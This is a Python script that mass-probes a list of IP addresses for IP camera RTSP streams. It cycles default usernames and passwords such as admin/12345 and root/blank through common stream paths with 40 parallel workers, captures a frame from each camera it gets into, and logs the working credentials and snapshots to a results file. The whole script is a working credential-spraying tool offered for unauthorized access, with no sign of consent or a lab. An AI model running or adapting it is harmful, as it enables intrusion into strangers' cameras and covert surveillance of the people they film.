#!/usr/bin/env python3
"""Fast RTSP-first camera stream finder"""
import subprocess, os, json, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

CREDS = [('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
         ('admin', '123456'), ('admin', '1111'), ('root', ''), ('root', 'pass')]

RTSP_PATHS = ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream', '/cam/realmonitor?channel=1&subtype=0', '/live/ch00_0', '/stream1']

os.makedirs('frames', exist_ok=True)

def probe_rtsp(ip):
    """Try RTSP with common creds - fastest path to stream"""
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            rtsp_url = f'rtsp://{user}:{passwd}@{ip}:554{rpath}'
            frame = f'frames/frame_{ip.replace(".", "_")}.jpg'
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=6, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    sz = os.path.getsize(frame)
                    return {'ip': ip, 'user': user, 'password': passwd,
                            'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                            'frame_file': frame, 'frame_size': sz}
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                pass
            # Clean failed frame
            if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
                os.remove(frame)
    return None

if __name__ == '__main__':
    # Usage: rtsp_probe.py [limit] [target_file]
    target_file = 'cam_targets_dual.txt'
    limit = 200
    if len(sys.argv) > 1:
        limit = int(sys.argv[1])
    if len(sys.argv) > 2:
        target_file = sys.argv[2]

    with open(target_file) as f:
        targets = [l.strip() for l in f if l.strip()]
    targets = targets[:limit]
    print(f'[*] RTSP-first probe on {len(targets)} targets | {len(CREDS)} creds × {len(RTSP_PATHS)} paths | 40 workers')
    print(f'[*] Started at {time.strftime("%H:%M:%S")}')

    results = []
    done = 0
    t0 = time.time()

    with ThreadPoolExecutor(max_workers=40) as pool:
        futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
        for fut in as_completed(futures):
            done += 1
            ip = futures[fut]
            try:
                r = fut.result()
                if r:
                    results.append(r)
                    print(f'  [{done}/{len(targets)}] STREAM FOUND: {ip} | {r["user"]}:{r["password"]} | {r["rtsp_path"]} | {r["frame_size"]}B')
                    sys.stdout.flush()
            except:
                pass
            if done % 20 == 0:
                elapsed = time.time() - t0
                print(f'  [{done}/{len(targets)}] scanned in {elapsed:.0f}s | {len(results)} streams found')
                sys.stdout.flush()

    elapsed = time.time() - t0
    print(f'\n{"="*70}')
    print(f'COMPLETE: {done} targets scanned in {elapsed:.0f}s | {len(results)} live RTSP streams')
    print(f'{"="*70}')
    for r in results:
        print(f'  {r["ip"]} | {r["user"]}:{r["password"]} | {r["rtsp_path"]} | {r["frame_size"]}B | {r["frame_file"]}')

    with open('titan-x-rtsp-results.json', 'w') as f:
        json.dump(results, f, indent=2)
    print(f'\nSaved to titan-x-rtsp-results.json')
